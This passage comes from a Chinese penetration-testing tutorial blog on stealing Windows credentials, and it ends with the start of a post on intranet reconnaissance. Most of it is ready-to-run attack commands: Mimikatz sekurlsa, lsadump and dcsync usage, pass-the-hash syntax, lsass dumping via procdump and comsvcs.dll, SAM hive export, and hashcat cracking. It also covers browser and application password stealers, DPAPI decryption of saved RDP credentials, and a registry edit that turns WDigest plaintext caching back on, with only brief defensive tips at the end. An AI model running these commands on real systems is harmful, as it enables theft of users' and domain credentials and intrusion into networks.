（又名万能钥匙）以及他们自己通常使用的密码进行身份验证。PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。SEKURLSA::Ekeys – 列出 Kerberos 密钥SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 Key(s)）。SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运行的服务和本地计算机在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。TOKEN::List – 列出系统中的所有令牌。TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来看几个常用的模块</p><h3 id="sekurlsa模块"><a href="#sekurlsa模块" class="headerlink" title="sekurlsa模块"></a>sekurlsa模块</h3><pre class="line-numbers language-none"><code class="language-none">privilege模块privilege::debug 提升为debug权限sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息sekurlsa::msv 获取HASH (LM,NTLM)sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码sekurlsa::tspkg 通过tspkg读取明文密码sekurlsa::livessp 通过livessp 读取明文密码sekurlsa::ssp 通过ssp 读取明文密码sekurlsa::logonPasswords 通过以上各种方法读取明文密码sekurlsa::process 将自己的进程切换到lsass进程中，之前只是注入读取信息sekurlsa::minidump file 这个模块可以读取已经打包的内存信息sekurlsa::pth 哈希传递sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxxsekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在cs上简单的使用:mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="process模块"><a href="#process模块" class="headerlink" title="process模块"></a>process模块</h3><pre class="line-numbers language-none"><code class="language-none">process::list 列出进程列表process::exports 导出进程列表process::imports 导入列表process::start 开始一个进程process::stop 停止一个程序process::suspend 冻结一个进程process::resume 从冻结中恢复process::run notepad 运行一个程序process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="kerberos模块"><a href="#kerberos模块" class="headerlink" title="kerberos模块"></a>kerberos模块</h3><pre class="line-numbers language-none"><code class="language-none">kerberos::list 列出系统中的票据kerberos::tgt 清除系统中的票据kerberos::purge 导入票据到系统中kerberos::ptc 票据路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lsadump模块"><a href="#lsadump模块" class="headerlink" title="lsadump模块"></a>lsadump模块</h3><pre class="line-numbers language-none"><code class="language-none">在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等lsadump::dcsync /domain:kevin.com /user:root(在域控上执行)读取所有域用户的哈希lsadump::lsa /patch从sam.hive和system.hive文件中获得NTLM Hashlsadump::sam /sam:sam.hive /system:system.hive从本地SAM文件中读取密码哈希token::elevatelsadump::sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SAM文件抓取密码"><a href="#SAM文件抓取密码" class="headerlink" title="SAM文件抓取密码"></a>SAM文件抓取密码</h2><h3 id="导出sam和system文件"><a href="#导出sam和system文件" class="headerlink" title="导出sam和system文件"></a>导出sam和system文件</h3><p>1、通多reg命令无工具导出</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\sam sam.hivereg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202174141247.png" alt="image-20230202174141247"></p><p>2、通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了 DC服务器上，ntds.dit 和 SYSTEM hive也能被拷 贝出来</p><pre class="line-numbers language-none"><code class="language-none">copy‐vss //直接将文件保存在当前目录下copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202174217687.png" alt="image-20230202174217687"></p><h3 id="读取sam和system文件获取密码"><a href="#读取sam和system文件获取密码" class="headerlink" title="读取sam和system文件获取密码"></a>读取sam和system文件获取密码</h3><pre class="line-numbers language-none"><code class="language-none">lsadump::sam /sam:sam.hive /system:system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202174254715.png" alt="d"></p><h1 id="Mimikatz在线读取sam和lsass获取密码"><a href="#Mimikatz在线读取sam和lsass获取密码" class="headerlink" title="Mimikatz在线读取sam和lsass获取密码"></a>Mimikatz在线读取sam和lsass获取密码</h1><h2 id="在线读取sam文件"><a href="#在线读取sam文件" class="headerlink" title="在线读取sam文件"></a>在线读取sam文件</h2><p>使用mimikatz在线读取sam文件</p><pre class="line-numbers language-none"><code class="language-none">分开的命令如下privilege::debugtoken:elevatelsadump::sam连起来mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202174340707.png" alt="image-20230202174340707"></p><h2 id="在线读取lsass进程"><a href="#在线读取lsass进程" class="headerlink" title="在线读取lsass进程"></a>在线读取lsass进程</h2><p>从lsass进程中提取passwords、keys、pin、tickets等信息</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::msv 获取HASH (LM,NTLM)sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码sekurlsa::tspkg 通过tspkg读取明文密码sekurlsa::livessp 通过livessp 读取明文密码sekurlsa::ssp 通过ssp 读取明文密码sekurlsa::logonPasswords 通过以上各种方法读取明文密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202174421922.png" alt="image-20230202174421922"></p><h1 id="Mimikatz离线读取lsass进程抓取密码"><a href="#Mimikatz离线读取lsass进程抓取密码" class="headerlink" title="Mimikatz离线读取lsass进程抓取密码"></a>Mimikatz离线读取lsass进程抓取密码</h1><h2 id="导出lsass文件方式"><a href="#导出lsass文件方式" class="headerlink" title="导出lsass文件方式"></a>导出lsass文件方式</h2><h3 id="1、使用任务管理器导出（windows-NT-6）"><a href="#1、使用任务管理器导出（windows-NT-6）" class="headerlink" title="1、使用任务管理器导出（windows NT 6）"></a>1、使用任务管理器导出（windows NT 6）</h3><p><img src="assets/image-20230202174536572.png" alt="image-20230202174536572"></p><h3 id="2、使用procdump-导出lsass-dmp文件"><a href="#2、使用procdump-导出lsass-dmp文件" class="headerlink" title="2、使用procdump 导出lsass.dmp文件"></a>2、使用procdump 导出lsass.dmp文件</h3><p>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管 理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入 的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p><pre class="line-numbers language-none"><code class="language-none">procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202174610054.png" alt="image-20230202174610054"></p><h3 id="3、使用PowerSploit-的Out-MiniDump模块"><a href="#3、使用PowerSploit-的Out-MiniDump模块" class="headerlink" title="3、使用PowerSploit 的Out-MiniDump模块"></a>3、使用PowerSploit 的Out-MiniDump模块</h3><p>PowerSploit是一个基于 Powershell 的渗透工具包，可以选择创建 进程的完整内存转储。</p><p>地址 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">import-Module .\Out-Minidump.ps1    (powershell-improt .\Out-Minidump.ps1)Get-Process lsass | Out-Minidump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202174630386.png" alt="image-20230202174630386"></p><h3 id="4、comsvcs-dll，系统自带。"><a href="#4、comsvcs-dll，系统自带。" class="headerlink" title="4、comsvcs.dll，系统自带。"></a>4、comsvcs.dll，系统自带。</h3><p>通过comsvcs.dll的导出函数MiniDump实现dump内存</p><p>首先查看lsass.exe进程PID: <code>tasklist | findstr lsass.exe</code> </p><p>使用powershell导出 <code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 488 C:\lsass.dmp full</code></p><p><img src="assets/image-20230202174658233.png" alt="image-20230202174658233"></p><h2 id="读取lsass-dmp文件"><a href="#读取lsass-dmp文件" class="headerlink" title="读取lsass.dmp文件"></a>读取lsass.dmp文件</h2><p>使用mimikatz读取lsass.dmp文件</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202174749633.png" alt="image-20230202174749633"></p><p><a href="https://blog.csdn.net/weixin_42136837/article/details/112616369">https://blog.csdn.net/weixin_42136837/article/details/112616369</a></p><h1 id="使用Hashcat和在线工具破解NTLM-Hash"><a href="#使用Hashcat和在线工具破解NTLM-Hash" class="headerlink" title="使用Hashcat和在线工具破解NTLM Hash"></a>使用Hashcat和在线工具破解NTLM Hash</h1><h2 id="Hashcat介绍"><a href="#Hashcat介绍" class="headerlink" title="Hashcat介绍"></a>Hashcat介绍</h2><p>Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。 </p><p>下载地址： <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a> </p><p>Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在 Windows下运行的</p><p><img src="assets/image-20230202174907443.png" alt="image-20230202174907443"></p><h2 id="使用hashcat破解NTLM-Hash"><a href="#使用hashcat破解NTLM-Hash" class="headerlink" title="使用hashcat破解NTLM Hash"></a>使用hashcat破解NTLM Hash</h2><pre class="line-numbers language-none"><code class="language-none">hashcat ‐m 1000 NTLM HASH字典 ‐‐force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202174942850.png" alt="image-20230202174942850"></p><h2 id="网站破解"><a href="#网站破解" class="headerlink" title="网站破解"></a>网站破解</h2><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h1 id="浏览器、数据库等其他密码的抓取"><a href="#浏览器、数据库等其他密码的抓取" class="headerlink" title="浏览器、数据库等其他密码的抓取"></a>浏览器、数据库等其他密码的抓取</h1><h2 id="BrowserGhost浏览器抓取"><a href="#BrowserGhost浏览器抓取" class="headerlink" title="BrowserGhost浏览器抓取"></a>BrowserGhost浏览器抓取</h2><p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下： </p><ul><li>实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集) </li><li>用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘) </li><li>可以解密chrome全版本密码(chrome80版本后加密方式变了) </li><li>Chrome已经可以获取login data、cookie、history、book了 </li><li>命令：<code>BrowserGhost.exe</code></li></ul><p><img src="assets/image-20230202175259790.png" alt="image-20230202175259790"></p><h2 id="Sharp-HackBrowserData浏览器"><a href="#Sharp-HackBrowserData浏览器" class="headerlink" title="Sharp-HackBrowserData浏览器"></a>Sharp-HackBrowserData浏览器</h2><ul><li>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓 </li><li>命令：<code>Sharp-HackBrowserData.exe</code></li></ul><p><img src="assets/image-20230202175353365.png" alt="image-20230202175353365"></p><p><img src="assets/image-20230202175401977.png" alt="image-20230202175401977"></p><h2 id="SharpDecryptPwd数据库"><a href="#SharpDecryptPwd数据库" class="headerlink" title="SharpDecryptPwd数据库"></a>SharpDecryptPwd数据库</h2><ul><li>SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包 </li><li>Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品</li></ul><pre class="line-numbers language-none"><code class="language-none">SharpDecryptPwd.exe -NavicatCryptoSharpDecryptPwd.exe -TeamViewerSharpDecryptPwd.exe -FileZillaSharpDecryptPwd.exe -WinSCPSharpDecryptPwd.exe -Xmangager -p Session_Path (-s UserSid)SharpDecryptPwd.exe -Browser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202175453606.png" alt="image-20230202175453606"></p><h2 id="LaZagne各类密码"><a href="#LaZagne各类密码" class="headerlink" title="LaZagne各类密码"></a>LaZagne各类密码</h2><ul><li>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算 法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。 </li><li>命令：<code>laZagne.exe all</code></li></ul><pre class="line-numbers language-none"><code class="language-none">laZagne.exe alllaZagne.exe browserslaZagne.exe browsers ‐firefoxlaZagne.exe all ‐oNlaZagne.exe all ‐oA ‐output C:\Users\test\DesktoplaZagne.exe ‐hlaZagne.exe browsers ‐hlaZagne.exe all ‐vvlaZagne.exe all ‐quiet ‐oA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202175540985-16753317422881.png" alt="image-20230202175540985"></p><h1 id="Windows其他类型抓取NTLM-HASH工具"><a href="#Windows其他类型抓取NTLM-HASH工具" class="headerlink" title="Windows其他类型抓取NTLM HASH工具"></a>Windows其他类型抓取NTLM HASH工具</h1><h2 id="getpassword"><a href="#getpassword" class="headerlink" title="getpassword"></a>getpassword</h2><p>打开GetPass工具所在的目录。打开命令行环境。运行64位程<code>GetPassword</code>。运行该程序后,即可获得明文密码</p><p><img src="assets/image-20230202175947353.png" alt="image-20230202175947353"></p><h2 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h2><p>在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash</p><p><img src="assets/image-20230202180010430.png" alt="image-20230202180010430"></p><h2 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h2><p>下载QuarksPwDump.exe,在命令行环境中输人 <code>QuarksPwDump.exe --dump-hash-local</code> 导出三个用户的NLMHash</p><p><img src="assets/image-20230202180041280.png" alt="image-20230202180041280"></p><h2 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h2><p>nishang中的 GET-PASSHashes.ps1可以可以获取hash</p><pre class="line-numbers language-none"><code class="language-none">Import‐Module .\Get‐PassHashes.ps1Get‐PassHashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230202180119702.png" alt="image-20230202180119702"></p><h2 id="wce"><a href="#wce" class="headerlink" title="wce"></a>wce</h2><p>这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。这款工具也分为32位和 64位两个不同的版本：</p><pre class="line-numbers language-none"><code class="language-none">‐l 列出登录的会话和NTLM凭据（默认值）‐s 修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:&lt;LM哈希&gt;:&lt;NT哈希&gt;‐r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次‐c 用一个特殊的NTML凭据运行一个新的会话 参数：‐e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次‐o 保存所有的输出到一个文件 参数:&lt;文件名&gt;‐i 指定一个LUID代替使用当前登录会话 参数:‐d 从登录会话中删除NTLM凭据 参数:‐a 使用地址 参数: &lt;地址&gt;‐f 强制使用安全模式‐g 生成LM和NT的哈希 参数&lt;密码&gt;‐K 缓存kerberos票据到一个文件（unix和windows wce格式）‐k 从一个文件中读取kerberos票据并插入到windows缓存中‐w 通过摘要式认证缓存一个明文的密码‐v 详细输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202180156060.png" alt="image-20230202180156060"></p><p><img src="assets/image-20230202180411948.png" alt="image-20230202180411948"></p><h1 id="Windows-RDP凭证的抓取和密码破解"><a href="#Windows-RDP凭证的抓取和密码破解" class="headerlink" title="Windows RDP凭证的抓取和密码破解"></a>Windows RDP凭证的抓取和密码破解</h1><h2 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h2><p>Credentials的解密是Windows系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解 为密码），接下来我们就讲解RDP凭证的抓取和破解 ,RDP(远程桌面)。</p><p>在我们点击保存密码后，Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密 从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来。</p><p><img src="assets/image-20230202180515275.png" alt="image-20230202180515275"></p><h2 id="凭证的查看"><a href="#凭证的查看" class="headerlink" title="凭证的查看"></a>凭证的查看</h2><p>查看凭证命令 </p><pre class="line-numbers language-none"><code class="language-none">查看mstsc的连接记录cmdkey /list查找本地的Credentialsdir /a %userprofile%\appdata\local\microsoft\credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230202180554709.png" alt="image-20230202180554709"></p><p><img src="assets/image-20230202180603540.png" alt="image-20230202180603540"></p><h2 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h2><p>1、使用mimikatz获取该文件的MasterKey的guid</p><pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以用于加密凭据文件FF22A1FDA68FD8515B52C534E8655421B的MasterKey的guid就是：{c271c658-e61b4023-95d2-dfbf18b0aa33}，所以我们只要从内存中找到这个guid对应的MasterKey的值即可</p><p><img src="assets/image-20230202180650004.png" alt="image-20230202180650004"></p><p>2、找到内存中对应的MasterKey</p><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202180713961.png" alt="image-20230202180713961"></p><p>3、最后打开mimikatz通过MasterKey值去解密凭据文件</p><pre class="line-numbers language-none"><code class="language-none">dpapi::cred /in:凭据文件路径 /masterky:masterkey值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202180745467.png" alt="image-20230202180745467"></p><h2 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h2><p>由于我们不能保证我们的mimikatz是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目 的其实很简单，就是把目标的文件和内存下载回来，在vps或本机上进行mimikatz解密即可。</p><p> 1、下载目标内存</p><pre class="line-numbers language-none"><code class="language-none">procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump #导出lsass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202180835043.png" alt="image-20230202180835043"></p><p>2、下载目标的Credentials文件</p><p><img src="assets/image-20230202180915140.png" alt="image-20230202180915140"></p><p>3、用mimikatz载入dump回来的内存</p><pre class="line-numbers language-none"><code class="language-none">Sekurlsa::minidump lsass1.dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202180935850.png" alt="image-20230202180935850"></p><p>4、获取Credentials的GUID</p><pre class="line-numbers language-none"><code class="language-none">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202180958678.png" alt="image-20230202180958678"></p><p>5、获取内存中所有的MasterKey</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202194358750.png" alt="image-20230202194358750"></p><p>6、利用MasterKey解密</p><pre class="line-numbers language-none"><code class="language-none">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230202194436859.png" alt="image-20230202194436859"></p><h1 id="Windows-2012R2之后抓取密码的方式"><a href="#Windows-2012R2之后抓取密码的方式" class="headerlink" title="Windows-2012R2之后抓取密码的方式"></a>Windows-2012R2之后抓取密码的方式</h1><p>在Windows2012系统及以上的系统，默认在<em>内存缓存中 禁止 保存明文密码</em>的。攻击者可以通过 <em>修改注册表</em> 的方式 抓取明文，需要用户<em>重新登录后</em>才能成功抓取</p><p><img src="assets/image-20230203154647667.png" alt="image-20230203154647667"></p><h2 id="修改注册表和锁屏"><a href="#修改注册表和锁屏" class="headerlink" title="修改注册表和锁屏"></a>修改注册表和锁屏</h2><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><pre class="line-numbers language-none"><code class="language-none">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f #开启reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f #关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230203154722396.png" alt="image-20230203154722396"></p><h3 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h3><pre class="line-numbers language-none"><code class="language-none">rundll32.exe user32.dll,LockWorkStation #锁屏query user #查询登录logoff ID号 #下线<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230203154749135.png" alt="image-20230203154749135"></p><h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p><img src="assets/image-20230203154808635.png" alt="image-20230203154808635"></p><h1 id="密码防范"><a href="#密码防范" class="headerlink" title="密码防范"></a>密码防范</h1><h2 id="2012R2域控设置"><a href="#2012R2域控设置" class="headerlink" title="2012R2域控设置"></a>2012R2域控设置</h2><p>在windows server 2012 R2中，新增了一个<em>Protected Users</em> 安全组，将用户加入到该私有组，用户的明文密码就不会 被获取</p><p><img src="assets/image-20230203154854263.png" alt="image-20230203154854263"></p><h2 id="安装KB2871997"><a href="#安装KB2871997" class="headerlink" title="安装KB2871997"></a>安装KB2871997</h2><p>2014年，Microsoft发布了<em>KB2871997补丁</em>，它主要包括了Windows 8.1和Windows Server 2012 R2中增强的安 全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止”哈希传递“的攻击方式，但其确实有助于是Windows 免受一些常见的攻击，例如：明文密码脱取、RDP凭据盗取、盗取本地Administrator账户进行横向移动。</p><h2 id="修改注册表-1"><a href="#修改注册表-1" class="headerlink" title="修改注册表"></a>修改注册表</h2><pre class="line-numbers language-none"><code class="language-none">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-2-zhang-nei-wang-xin-xi-shou-ji/di-2-zhang-nei-wang-xin-xi-shou-ji/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-2-zhang-nei-wang-xin-xi-shou-ji/di-2-zhang-nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="手动收集本机信息"><a href="#手动收集本机信息" class="headerlink" title="手动收集本机信息"></a>手动收集本机信息</h1><h2 id="内网本地信息收集"><a href="#内网本地信息收集" class="headerlink" title="内网本地信息收集"></a>内网本地信息收集</h2><p>不管是在外网中还是在内网中,信息收集都是重要的第一步。对于内网中的一台机器,其所处内网的结构是什么样 的、其角色是什么、使用这台机器的人的角色是什么,以及这台机器上安装了什么杀毒软件、这台机器是通过什么方 式上网的、这台机器是笔记本电脑还是台式机等问题,都需要通过信息收集来解答。</p><h2 id="网络配置信息"><a href="#网络配置信息" class="headerlink" title="网络配置信息"></a>网络配置信息</h2><p>获取本机的网络配置信息</p><pre class="line-numbers language-none"><code class="language-none">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229194850357.png" alt="image-20221229194850357"></p><h2 id="操作系统和软件信息"><a href="#操作系统和软件信息" class="headerlink" title="操作系统和软件信息"></a>操作系统和软件信息</h2><p>查询操作系统和版本信息</p><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"systeminfo| findstr /B /C:"OS 名称" /C:"OS 版本"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221229194957670.png" alt="image-20221229194957670"></p><p>查看系统体系结构</p><pre class="line-numbers language-none"><code class="language-none">echo %PROCESSOR_ARCHITECTURE%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看安装的软件及版本</p><pre class="line-numbers language-none"><code class="language-none">wmic product get name,version shell powershell "Get-WmiObject -class win32_product | Select-Object -Property name,version"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="本机服务信息"><a href="#本机服务信息" class="headerlink" title="本机服务信息"></a>本机服务信息</h2><pre class="line-numbers language-none"><code class="language-none">wmic service list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195141145.png" alt="image-20221229195141145"></p><h2 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h2><pre class="line-numbers language-none"><code class="language-none">tasklist wmic process list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20221229195222861.png" alt="image-20221229195222861"></p><h2 id="启动程序信息"><a href="#启动程序信息" class="headerlink" title="启动程序信息"></a>启动程序信息</h2><pre class="line-numbers language-none"><code class="language-none">wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195258892.png" alt="image-20221229195258892"></p><h2 id="计划任务信息"><a href="#计划任务信息" class="headerlink" title="计划任务信息"></a>计划任务信息</h2><p>如果出现无法加载列资源 输入：<code>chcp 437</code></p><pre class="line-numbers language-none"><code class="language-none">schtasks /query /fo LIST /v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="主机开机时间信息"><a href="#主机开机时间信息" class="headerlink" title="主机开机时间信息"></a>主机开机时间信息</h2><pre class="line-numbers language-none"><code class="language-none">net statistics workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195401317.png" 